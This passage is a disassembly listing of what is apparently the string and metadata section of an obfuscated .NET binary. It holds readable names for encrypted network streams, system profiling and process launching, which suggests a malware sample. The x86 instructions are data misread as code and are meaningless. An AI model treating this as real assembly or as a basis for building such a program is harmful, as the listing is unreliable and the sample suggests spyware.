  408fe0:	65 66 43             	gs inc %bx
  408fe3:	72 54                	jb     0x409039
  408fe5:	66 48                	dec    %ax
  408fe7:	42                   	inc    %edx
  408fe8:	6d                   	insl   (%dx),%es:(%edi)
  408fe9:	00 6c 63 4b          	add    %ch,0x4b(%ebx,%eiz,2)
  408fed:	54                   	push   %esp
  408fee:	57                   	push   %edi
  408fef:	42                   	inc    %edx
  408ff0:	4a                   	dec    %edx
  408ff1:	4a                   	dec    %edx
  408ff2:	75 49                	jne    0x40903d
  408ff4:	6d                   	insl   (%dx),%es:(%edi)
  408ff5:	00 42 6c             	add    %al,0x6c(%edx)
  408ff8:	78 6d                	js     0x409067
  408ffa:	71 74                	jno    0x409070
  408ffc:	6a 5a                	push   $0x5a
  408ffe:	67 51                	addr16 push %ecx
  409000:	6d                   	insl   (%dx),%es:(%edi)
  409001:	00 72 75             	add    %dh,0x75(%edx)
  409004:	58                   	pop    %eax
  409005:	4c                   	dec    %esp
  409006:	58                   	pop    %eax
  409007:	68 71 48 54 42       	push   $0x42544871
  40900c:	53                   	push   %ebx
  40900d:	6d                   	insl   (%dx),%es:(%edi)
  40900e:	00 46 69             	add    %al,0x69(%esi)
  409011:	6c                   	insb   (%dx),%es:(%edi)
  409012:	65 53                	gs push %ebx
  409014:	74 72                	je     0x409088
  409016:	65 61                	gs popa
  409018:	6d                   	insl   (%dx),%es:(%edi)
  409019:	00 4e 65             	add    %cl,0x65(%esi)
  40901c:	74 77                	je     0x409095
  40901e:	6f                   	outsl  %ds:(%esi),(%dx)
  40901f:	72 6b                	jb     0x40908c
  409021:	53                   	push   %ebx
  409022:	74 72                	je     0x409096
  409024:	65 61                	gs popa
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	00 53 73             	add    %dl,0x73(%ebx)
  40902a:	6c                   	insb   (%dx),%es:(%edi)
  40902b:	53                   	push   %ebx
  40902c:	74 72                	je     0x4090a0
  40902e:	65 61                	gs popa
  409030:	6d                   	insl   (%dx),%es:(%edi)
  409031:	00 43 72             	add    %al,0x72(%ebx)
  409034:	79 70                	jns    0x4090a6
  409036:	74 6f                	je     0x4090a7
  409038:	53                   	push   %ebx
  409039:	74 72                	je     0x4090ad
  40903b:	65 61                	gs popa
  40903d:	6d                   	insl   (%dx),%es:(%edi)
  40903e:	00 47 5a             	add    %al,0x5a(%edi)
  409041:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409048:	6d                   	insl   (%dx),%es:(%edi)
  409049:	00 4d 65             	add    %cl,0x65(%ebp)
  40904c:	6d                   	insl   (%dx),%es:(%edi)
  40904d:	6f                   	outsl  %ds:(%esi),(%dx)
  40904e:	72 79                	jb     0x4090c9
  409050:	53                   	push   %ebx
  409051:	74 72                	je     0x4090c5
  409053:	65 61                	gs popa
  409055:	6d                   	insl   (%dx),%es:(%edi)
  409056:	00 67 65             	add    %ah,0x65(%edi)
  409059:	74 5f                	je     0x4090ba
  40905b:	49                   	dec    %ecx
  40905c:	74 65                	je     0x4090c3
  40905e:	6d                   	insl   (%dx),%es:(%edi)
  40905f:	00 67 65             	add    %ah,0x65(%edi)
  409062:	74 5f                	je     0x4090c3
  409064:	49                   	dec    %ecx
  409065:	73 36                	jae    0x40909d
  409067:	34 42                	xor    $0x42,%al
  409069:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  409070:	74 
  409071:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409078:	65 6d                	gs insl (%dx),%es:(%edi)
  40907a:	00 78 69             	add    %bh,0x69(%eax)
  40907d:	57                   	push   %edi
  40907e:	78 5a                	js     0x4090da
  409080:	5a                   	pop    %edx
  409081:	6b 5a 7a 67          	imul   $0x67,0x7a(%edx),%ebx
  409085:	68 6d 00 53 79       	push   $0x7953006d
  40908a:	6d                   	insl   (%dx),%es:(%edi)
  40908b:	6d                   	insl   (%dx),%es:(%edi)
  40908c:	65 74 72             	gs je  0x409101
  40908f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409096:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40909d:	79 
  40909e:	6d                   	insl   (%dx),%es:(%edi)
  40909f:	6d                   	insl   (%dx),%es:(%edi)
  4090a0:	65 74 72             	gs je  0x409115
  4090a3:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4090aa:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4090b1:	73 
  4090b2:	68 41 6c 67 6f       	push   $0x6f676c41
  4090b7:	72 69                	jb     0x409122
  4090b9:	74 68                	je     0x409123
  4090bb:	6d                   	insl   (%dx),%es:(%edi)
  4090bc:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4090c0:	6d                   	insl   (%dx),%es:(%edi)
  4090c1:	00 52 61             	add    %dl,0x61(%edx)
  4090c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c5:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090c7:	6d                   	insl   (%dx),%es:(%edi)
  4090c8:	00 49 43             	add    %cl,0x43(%ecx)
  4090cb:	72 79                	jb     0x409146
  4090cd:	70 74                	jo     0x409143
  4090cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d0:	54                   	push   %esp
  4090d1:	72 61                	jb     0x409134
  4090d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d4:	73 66                	jae    0x40913c
  4090d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d7:	72 6d                	jb     0x409146
  4090d9:	00 45 6e             	add    %al,0x6e(%ebp)
  4090dc:	75 6d                	jne    0x40914b
  4090de:	00 58 4e             	add    %bl,0x4e(%eax)
  4090e1:	53                   	push   %ebx
  4090e2:	61                   	popa
  4090e3:	41                   	inc    %ecx
  4090e4:	48                   	dec    %eax
  4090e5:	4e                   	dec    %esi
  4090e6:	4a                   	dec    %edx
  4090e7:	41                   	inc    %ecx
  4090e8:	52                   	push   %edx
  4090e9:	5a                   	pop    %edx
  4090ea:	7a 6d                	jp     0x409159
  4090ec:	00 71 41             	add    %dh,0x41(%ecx)
  4090ef:	46                   	inc    %esi
  4090f0:	77 49                	ja     0x40913b
  4090f2:	59                   	pop    %ecx
  4090f3:	53                   	push   %ebx
  4090f4:	61                   	popa
  4090f5:	68 64 6a 4c 6e       	push   $0x6e4c6a64
  4090fa:	00 78 49             	add    %bh,0x49(%eax)
  4090fd:	4a                   	dec    %edx
  4090fe:	4a                   	dec    %edx
  4090ff:	66 5a                	pop    %dx
  409101:	70 73                	jo     0x409176
  409103:	61                   	popa
  409104:	68 4d 6e 00 69       	push   $0x69006e4d
  409109:	43                   	inc    %ebx
  40910a:	55                   	push   %ebp
  40910b:	45                   	inc    %ebp
  40910c:	4c                   	dec    %esp
  40910d:	73 4d                	jae    0x40915c
  40910f:	48                   	dec    %eax
  409110:	68 74 68 70 52       	push   $0x52706874
  409115:	6e                   	outsb  %ds:(%esi),(%dx)
  409116:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40911a:	6f                   	outsl  %ds:(%esi),(%dx)
  40911b:	6f                   	outsl  %ds:(%esi),(%dx)
  40911c:	6c                   	insb   (%dx),%es:(%edi)
  40911d:	65 61                	gs popa
  40911f:	6e                   	outsb  %ds:(%esi),(%dx)
  409120:	00 4d 61             	add    %cl,0x61(%ebp)
  409123:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40912a:	43                   	inc    %ebx
  40912b:	68 61 69 6e 00       	push   $0x6e6961
  409130:	41                   	inc    %ecx
  409131:	70 70                	jo     0x4091a3
  409133:	44                   	inc    %esp
  409134:	6f                   	outsl  %ds:(%esi),(%dx)
  409135:	6d                   	insl   (%dx),%es:(%edi)
  409136:	61                   	popa
  409137:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40913e:	43                   	inc    %ebx
  40913f:	75 72                	jne    0x4091b3
  409141:	72 65                	jb     0x4091a8
  409143:	6e                   	outsb  %ds:(%esi),(%dx)
  409144:	74 44                	je     0x40918a
  409146:	6f                   	outsl  %ds:(%esi),(%dx)
  409147:	6d                   	insl   (%dx),%es:(%edi)
  409148:	61                   	popa
  409149:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  409150:	00 47 65             	add    %al,0x65(%edi)
  409153:	74 46                	je     0x40919b
  409155:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40915c:	57 
  40915d:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409164:	78 
  409165:	74 65                	je     0x4091cc
  409167:	6e                   	outsb  %ds:(%esi),(%dx)
  409168:	73 69                	jae    0x4091d3
  40916a:	6f                   	outsl  %ds:(%esi),(%dx)
  40916b:	6e                   	outsb  %ds:(%esi),(%dx)
  40916c:	00 67 65             	add    %ah,0x65(%edi)
  40916f:	74 5f                	je     0x4091d0
  409171:	4f                   	dec    %edi
  409172:	53                   	push   %ebx
  409173:	56                   	push   %esi
  409174:	65 72 73             	gs jb  0x4091ea
  409177:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40917e:	74 65                	je     0x4091e5
  409180:	6d                   	insl   (%dx),%es:(%edi)
  409181:	2e 49                	cs dec %ecx
  409183:	4f                   	dec    %edi
  409184:	2e 43                	cs inc %ebx
  409186:	6f                   	outsl  %ds:(%esi),(%dx)
  409187:	6d                   	insl   (%dx),%es:(%edi)
  409188:	70 72                	jo     0x4091fc
  40918a:	65 73 73             	gs jae 0x409200
  40918d:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  409194:	6c                   	insb   (%dx),%es:(%edi)
  409195:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40919c:	00 53 79             	add    %dl,0x79(%ebx)
  40919f:	73 74                	jae    0x409215
  4091a1:	65 6d                	gs insl (%dx),%es:(%edi)
  4091a3:	2e 53                	cs push %ebx
  4091a5:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091a9:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4091b0:	68 
  4091b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091b3:	74 69                	je     0x40921e
  4091b5:	63 61 74             	arpl   %esp,0x74(%ecx)
  4091b8:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091bf:	74 65                	je     0x409226
  4091c1:	6d                   	insl   (%dx),%es:(%edi)
  4091c2:	2e 52                	cs push %edx
  4091c4:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4091c7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4091cd:	00 58 35             	add    %bl,0x35(%eax)
  4091d0:	30 39                	xor    %bh,(%ecx)
  4091d2:	43                   	inc    %ebx
  4091d3:	65 72 74             	gs jb  0x40924a
  4091d6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4091dd:	43                   	inc    %ebx
  4091de:	6f                   	outsl  %ds:(%esi),(%dx)
  4091df:	6c                   	insb   (%dx),%es:(%edi)
  4091e0:	6c                   	insb   (%dx),%es:(%edi)
  4091e1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e7:	00 4d 61             	add    %cl,0x61(%ebp)
  4091ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4091eb:	61                   	popa
  4091ec:	67 65 6d             	gs insl (%dx),%es:(%di)
  4091ef:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091f1:	74 4f                	je     0x409242
  4091f3:	62 6a 65             	bound  %ebp,0x65(%edx)
  4091f6:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4091fa:	6c                   	insb   (%dx),%es:(%edi)
  4091fb:	6c                   	insb   (%dx),%es:(%edi)
  4091fc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409201:	6e                   	outsb  %ds:(%esi),(%dx)
  409202:	00 73 65             	add    %dh,0x65(%ebx)
  409205:	74 5f                	je     0x409266
  409207:	50                   	push   %eax
  409208:	6f                   	outsl  %ds:(%esi),(%dx)
  409209:	73 69                	jae    0x409274
  40920b:	74 69                	je     0x409276
  40920d:	6f                   	outsl  %ds:(%esi),(%dx)
  40920e:	6e                   	outsb  %ds:(%esi),(%dx)
  40920f:	00 43 72             	add    %al,0x72(%ebx)
  409212:	79 70                	jns    0x409284
  409214:	74 6f                	je     0x409285
  409216:	67 72 61             	addr16 jb 0x40927a
  409219:	70 68                	jo     0x409283
  40921b:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  409222:	74 69                	je     0x40928d
  409224:	6f                   	outsl  %ds:(%esi),(%dx)
  409225:	6e                   	outsb  %ds:(%esi),(%dx)
  409226:	00 41 72             	add    %al,0x72(%ecx)
  409229:	67 75 6d             	addr16 jne 0x409299
  40922c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40922e:	74 4e                	je     0x40927e
  409230:	75 6c                	jne    0x40929e
  409232:	6c                   	insb   (%dx),%es:(%edi)
  409233:	45                   	inc    %ebp
  409234:	78 63                	js     0x409299
  409236:	65 70 74             	gs jo  0x4092ad
  409239:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  409240:	75 6d                	jne    0x4092af
  409242:	65 6e                	outsb  %gs:(%esi),(%dx)
  409244:	74 45                	je     0x40928b
  409246:	78 63                	js     0x4092ab
  409248:	65 70 74             	gs jo  0x4092bf
  40924b:	69 6f 6e 00 46 57 42 	imul   $0x42574600,0x6e(%edi),%ebp
  409252:	52                   	push   %edx
  409253:	59                   	pop    %ecx
  409254:	4e                   	dec    %esi
  409255:	56                   	push   %esi
  409256:	55                   	push   %ebp
  409257:	62 51 73             	bound  %edx,0x73(%ecx)
  40925a:	6e                   	outsb  %ds:(%esi),(%dx)
  40925b:	00 43 48             	add    %al,0x48(%ebx)
  40925e:	50                   	push   %eax
  40925f:	57                   	push   %edi
  409260:	4e                   	dec    %esi
  409261:	53                   	push   %ebx
  409262:	53                   	push   %ebx
  409263:	75 78                	jne    0x4092dd
  409265:	74 76                	je     0x4092dd
  409267:	6e                   	outsb  %ds:(%esi),(%dx)
  409268:	00 49 6d             	add    %cl,0x6d(%ecx)
  40926b:	61                   	popa
  40926c:	67 65 43             	addr16 gs inc %ebx
  40926f:	6f                   	outsl  %ds:(%esi),(%dx)
  409270:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  409275:	66 6f                	outsw  %ds:(%esi),(%dx)
  409277:	00 46 69             	add    %al,0x69(%esi)
  40927a:	6c                   	insb   (%dx),%es:(%edi)
  40927b:	65 49                	gs dec %ecx
  40927d:	6e                   	outsb  %ds:(%esi),(%dx)
  40927e:	66 6f                	outsw  %ds:(%esi),(%dx)
  409280:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  409284:	76 65                	jbe    0x4092eb
  409286:	49                   	dec    %ecx
  409287:	6e                   	outsb  %ds:(%esi),(%dx)
  409288:	66 6f                	outsw  %ds:(%esi),(%dx)
  40928a:	00 46 69             	add    %al,0x69(%esi)
  40928d:	6c                   	insb   (%dx),%es:(%edi)
  40928e:	65 53                	gs push %ebx
  409290:	79 73                	jns    0x409305
  409292:	74 65                	je     0x4092f9
  409294:	6d                   	insl   (%dx),%es:(%edi)
  409295:	49                   	dec    %ecx
  409296:	6e                   	outsb  %ds:(%esi),(%dx)
  409297:	66 6f                	outsw  %ds:(%esi),(%dx)
  409299:	00 43 6f             	add    %al,0x6f(%ebx)
  40929c:	6d                   	insl   (%dx),%es:(%edi)
  40929d:	70 75                	jo     0x409314
  40929f:	74 65                	je     0x409306
  4092a1:	72 49                	jb     0x4092ec
  4092a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092a6:	00 43 53             	add    %al,0x53(%ebx)
  4092a9:	68 61 72 70 41       	push   $0x41707261
  4092ae:	72 67                	jb     0x409317
  4092b0:	75 6d                	jne    0x40931f
  4092b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b4:	74 49                	je     0x4092ff
  4092b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092b9:	00 50 72             	add    %dl,0x72(%eax)
  4092bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4092bd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4092c0:	73 53                	jae    0x409315
  4092c2:	74 61                	je     0x409325
  4092c4:	72 74                	jb     0x40933a
  4092c6:	49                   	dec    %ecx
  4092c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092ca:	00 63 78             	add    %ah,0x78(%ebx)
  4092cd:	70 64                	jo     0x409333
  4092cf:	47                   	inc    %edi
  4092d0:	77 70                	ja     0x409342
  4092d2:	70 43                	jo     0x409317
  4092d4:	4e                   	dec    %esi
  4092d5:	6b 54 67 6f 00       	imul   $0x0,0x6f(%edi,%eiz,2),%edx
  4092da:	73 4e                	jae    0x40932a
  4092dc:	68 41 45 4a 5a       	push   $0x5a4a4541
  4092e1:	63 67 6d             	arpl   %esp,0x6d(%edi)
  4092e4:	68 6f 00 6c 4d       	push   $0x4d6c006f
  4092e9:	50                   	push   %eax
  4092ea:	64 75 69             	fs jne 0x409356
  4092ed:	4a                   	dec    %edx
  4092ee:	54                   	push   %esp
  4092ef:	71 68                	jno    0x409359
  4092f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f2:	00 64 57 4a          	add    %ah,0x4a(%edi,%edx,2)
  4092f6:	69 72 48 59 4b 4a 77 	imul   $0x774a4b59,0x48(%edx),%esi
  4092fd:	4f                   	dec    %edi
  4092fe:	74 48                	je     0x409348
  409300:	41                   	inc    %ecx
  409301:	72 6f                	jb     0x409372
  409303:	00 6b 4e             	add    %ch,0x4e(%ebx)
  409306:	54                   	push   %esp
  409307:	42                   	inc    %edx
  409308:	48                   	dec    %eax
  409309:	69 64 78 75 6f 00 49 	imul   $0x7349006f,0x75(%eax,%edi,2),%esp
  409310:	73 
  409311:	55                   	push   %ebp
  409312:	6a 7a                	push   $0x7a
  409314:	6d                   	insl   (%dx),%es:(%edi)
  409315:	56                   	push   %esi
  409316:	4f                   	dec    %edi
  409317:	5a                   	pop    %edx
  409318:	72 41                	jb     0x40935b
  40931a:	66 79 75             	data16 jns 0x409392
  40931d:	4c                   	dec    %esp
  40931e:	70 00                	jo     0x409320
  409320:	77 75                	ja     0x409397
  409322:	52                   	push   %edx
  409323:	5a                   	pop    %edx
  409324:	55                   	push   %ebp
  409325:	48                   	dec    %eax
  409326:	6c                   	insb   (%dx),%es:(%edi)
  409327:	6b 4f 70 00          	imul   $0x0,0x70(%edi),%ecx
  40932b:	66 57                	push   %di
  40932d:	4a                   	dec    %edx
  40932e:	72 7a                	jb     0x4093aa
  409330:	58                   	pop    %eax
  409331:	6b 63 69 64          	imul   $0x64,0x69(%ebx),%esp
  409335:	70 00                	jo     0x409337
  409337:	53                   	push   %ebx
  409338:	6c                   	insb   (%dx),%es:(%edi)
  409339:	65 65 70 00          	gs gs jo 0x40933d
  40933d:	74 69                	je     0x4093a8
  40933f:	4a                   	dec    %edx
  409340:	41                   	inc    %ecx
  409341:	65 59                	gs pop %ecx
  409343:	73 71                	jae    0x4093b6
  409345:	61                   	popa
  409346:	53                   	push   %ebx
  409347:	68 67 70 00 69       	push   $0x69007067
  40934c:	5a                   	pop    %edx
  40934d:	51                   	push   %ecx
  40934e:	44                   	inc    %esp
  40934f:	69 70 48 57 42 4e 68 	imul   $0x684e4257,0x48(%eax),%esi
  409356:	6a 70                	push   $0x70
  409358:	00 66 68             	add    %ah,0x68(%esi)
  40935b:	6d                   	insl   (%dx),%es:(%edi)
  40935c:	4a                   	dec    %edx
  40935d:	68 6a 75 75 78       	push   $0x7875756a
  409362:	6c                   	insb   (%dx),%es:(%edi)
  409363:	70 00                	jo     0x409365
  409365:	41                   	inc    %ecx
  409366:	71 43                	jno    0x4093ab
  409368:	70 4a                	jo     0x4093b4
  40936a:	52                   	push   %edx
  40936b:	7a 79                	jp     0x4093e6
  40936d:	76 78                	jbe    0x4093e7
  40936f:	7a 56                	jp     0x4093c7
  409371:	6d                   	insl   (%dx),%es:(%edi)
  409372:	70 00                	jo     0x409374
  409374:	59                   	pop    %ecx
  409375:	42                   	inc    %edx
  409376:	42                   	inc    %edx
  409377:	6b 4e 49 78          	imul   $0x78,0x49(%esi),%ecx
  40937b:	70 47                	jo     0x4093c4
  40937d:	56                   	push   %esi
  40937e:	6f                   	outsl  %ds:(%esi),(%dx)
  40937f:	6e                   	outsb  %ds:(%esi),(%dx)
  409380:	70 00                	jo     0x409382
  409382:	4d                   	dec    %ebp
  409383:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40938a:	74 2e                	je     0x4093ba
  40938c:	43                   	inc    %ebx
  40938d:	53                   	push   %ebx
  40938e:	68 61 72 70 00       	push   $0x707261
  409393:	52                   	push   %edx
  409394:	66 76 63             	data16 jbe 0x4093fa
  409397:	6f                   	outsl  %ds:(%esi),(%dx)
  409398:	4a                   	dec    %edx
  409399:	59                   	pop    %ecx
  40939a:	6f                   	outsl  %ds:(%esi),(%dx)
  40939b:	78 47                	js     0x4093e4
  40939d:	52                   	push   %edx
  40939e:	4b                   	dec    %ebx
  40939f:	75 70                	jne    0x409411
  4093a1:	00 5a 79             	add    %bl,0x79(%edx)
  4093a4:	42                   	inc    %edx
  4093a5:	73 4a                	jae    0x4093f1
  4093a7:	66 7a 6d             	data16 jp 0x409417
  4093aa:	5a                   	pop    %edx
  4093ab:	76 47                	jbe    0x4093f4
  4093ad:	79 70                	jns    0x40941f
  4093af:	00 6d 43             	add    %ch,0x43(%ebp)
  4093b2:	56                   	push   %esi
  4093b3:	67 44                	addr16 inc %esp
  4093b5:	56                   	push   %esi
  4093b6:	41                   	inc    %ecx
  4093b7:	7a 4e                	jp     0x409407
  4093b9:	43                   	inc    %ebx
  4093ba:	71 00                	jno    0x4093bc
  4093bc:	70 51                	jo     0x40940f
  4093be:	77 51                	ja     0x409411
  4093c0:	63 43 44             	arpl   %eax,0x44(%ebx)
  4093c3:	56                   	push   %esi
  4093c4:	55                   	push   %ebp
  4093c5:	63 76 54             	arpl   %esi,0x54(%esi)
  4093c8:	76 51                	jbe    0x40941b
  4093ca:	55                   	push   %ebp
  4093cb:	71 00                	jno    0x4093cd
  4093cd:	76 52                	jbe    0x409421
  4093cf:	6c                   	insb   (%dx),%es:(%edi)
  4093d0:	55                   	push   %ebp
  4093d1:	41                   	inc    %ecx
  4093d2:	62 4a 64             	bound  %ecx,0x64(%edx)
  4093d5:	79 42                	jns    0x409419
  4093d7:	4d                   	dec    %ebp
  4093d8:	79 55                	jns    0x40942f
  4093da:	71 00                	jno    0x4093dc
  4093dc:	42                   	inc    %edx
  4093dd:	41                   	inc    %ecx
  4093de:	6a 78                	push   $0x78
  4093e0:	7a 6f                	jp     0x409451
  4093e2:	78 6a                	js     0x40944e
  4093e4:	6c                   	insb   (%dx),%es:(%edi)
  4093e5:	45                   	inc    %ebp
  4093e6:	47                   	inc    %edi
  4093e7:	59                   	pop    %ecx
  4093e8:	71 00                	jno    0x4093ea
  4093ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4093eb:	68 52 6b 67 77       	push   $0x77676b52
  4093f0:	43                   	inc    %ebx
  4093f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f2:	46                   	inc    %esi
  4093f3:	6c                   	insb   (%dx),%es:(%edi)
  4093f4:	56                   	push   %esi
  4093f5:	63 71 00             	arpl   %esi,0x0(%ecx)
  4093f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f9:	41                   	inc    %ecx
  4093fa:	44                   	inc    %esp
  4093fb:	49                   	dec    %ecx
  4093fc:	44                   	inc    %esp
  4093fd:	4d                   	dec    %ebp
  4093fe:	58                   	pop    %eax
  4093ff:	58                   	pop    %eax
  409400:	6a 71                	push   $0x71
  409402:	00 53 63             	add    %dl,0x63(%ebx)
  409405:	62 48 77             	bound  %ecx,0x77(%eax)
  409408:	57                   	push   %edi
  409409:	55                   	push   %ebp
  40940a:	4d                   	dec    %ebp
  40940b:	4a                   	dec    %edx
  40940c:	48                   	dec    %eax
  40940d:	46                   	inc    %esi
  40940e:	6b 71 00 53          	imul   $0x53,0x0(%ecx),%esi
  409412:	79 73                	jns    0x409487
  409414:	74 65                	je     0x40947b
  409416:	6d                   	insl   (%dx),%es:(%edi)
  409417:	2e 4c                	cs dec %esp
  409419:	69 6e 71 00 54 74 41 	imul   $0x41745400,0x71(%esi),%ebp
  409420:	65 4d                	gs dec %ebp
  409422:	6d                   	insl   (%dx),%es:(%edi)
  409423:	41                   	inc    %ecx
  409424:	62 47 6c             	bound  %eax,0x6c(%edi)
  409427:	44                   	inc    %esp
  409428:	72 00                	jb     0x40942a
  40942a:	4c                   	dec    %esp
  40942b:	54                   	push   %esp
  40942c:	68 67 4d 43 58       	push   $0x58434d67
  409431:	42                   	inc    %edx
  409432:	61                   	popa
  409433:	66 54                	push   %sp
  409435:	57                   	push   %edi
  409436:	47                   	inc    %edi
  409437:	72 00                	jb     0x409439
  409439:	54                   	push   %esp
  40943a:	45                   	inc    %ebp
  40943b:	71 62                	jno    0x40949f
  40943d:	4b                   	dec    %ebx
  40943e:	79 69                	jns    0x4094a9
  409440:	41                   	inc    %ecx
  409441:	68 43 68 6e 53       	push   $0x536e6843
  409446:	72 00                	jb     0x409448
  409448:	43                   	inc    %ebx
  409449:	6c                   	insb   (%dx),%es:(%edi)
  40944a:	65 61                	gs popa
  40944c:	72 00                	jb     0x40944e
  40944e:	43                   	inc    %ebx
  40944f:	68 61 72 00 49       	push   $0x49007261
  409454:	6e                   	outsb  %ds:(%esi),(%dx)
  409455:	76 6f                	jbe    0x4094c6
  409457:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40945b:	6d                   	insl   (%dx),%es:(%edi)
  40945c:	62 65 72             	bound  %esp,0x72(%ebp)
  40945f:	00 4d 44             	add    %cl,0x44(%ebp)
  409462:	35 43 72 79 70       	xor    $0x70797243,%eax
  409467:	74 6f                	je     0x4094d8
  409469:	53                   	push   %ebx
  40946a:	65 72 76             	gs jb  0x4094e3
  40946d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409474:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40947b:	41 
  40947c:	43                   	inc    %ebx
  40947d:	72 79                	jb     0x4094f8
  40947f:	70 74                	jo     0x4094f5
  409481:	6f                   	outsl  %ds:(%esi),(%dx)
  409482:	53                   	push   %ebx
  409483:	65 72 76             	gs jb  0x4094fc
  409486:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40948d:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  409494:	73 
  409495:	43                   	inc    %ebx
  409496:	72 79                	jb     0x409511
  409498:	70 74                	jo     0x40950e
  40949a:	6f                   	outsl  %ds:(%esi),(%dx)
  40949b:	53                   	push   %ebx
  40949c:	65 72 76             	gs jb  0x409515
  40949f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094a6:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094ad:	72 
  4094ae:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094b5:	64 65 72 00          	fs gs jb 0x4094b9
  4094b9:	4d                   	dec    %ebp
  4094ba:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094c1:	74 2e                	je     0x4094f1
  4094c3:	43                   	inc    %ebx
  4094c4:	53                   	push   %ebx
  4094c5:	68 61 72 70 2e       	push   $0x2e707261
  4094ca:	52                   	push   %edx
  4094cb:	75 6e                	jne    0x40953b
  4094cd:	74 69                	je     0x409538
  4094cf:	6d                   	insl   (%dx),%es:(%edi)
  4094d0:	65 42                	gs inc %edx
  4094d2:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4094d9:	61                   	popa
  4094da:	6c                   	insb   (%dx),%es:(%edi)
  4094db:	6c                   	insb   (%dx),%es:(%edi)
  4094dc:	53                   	push   %ebx
  4094dd:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4094e4:	65 
  4094e5:	72 00                	jb     0x4094e7
  4094e7:	67 65 74 5f          	addr16 gs je 0x40954a
  4094eb:	42                   	inc    %edx
  4094ec:	75 66                	jne    0x409554
  4094ee:	66 65 72 00          	data16 gs jb 0x4094f2
  4094f2:	73 65                	jae    0x409559
  4094f4:	74 5f                	je     0x409555
  4094f6:	42                   	inc    %edx
  4094f7:	75 66                	jne    0x40955f
  4094f9:	66 65 72 00          	data16 gs jb 0x4094fd
  4094fd:	67 65 74 5f          	addr16 gs je 0x409560
  409501:	41                   	inc    %ecx
  409502:	73 49                	jae    0x40954d
  409504:	6e                   	outsb  %ds:(%esi),(%dx)
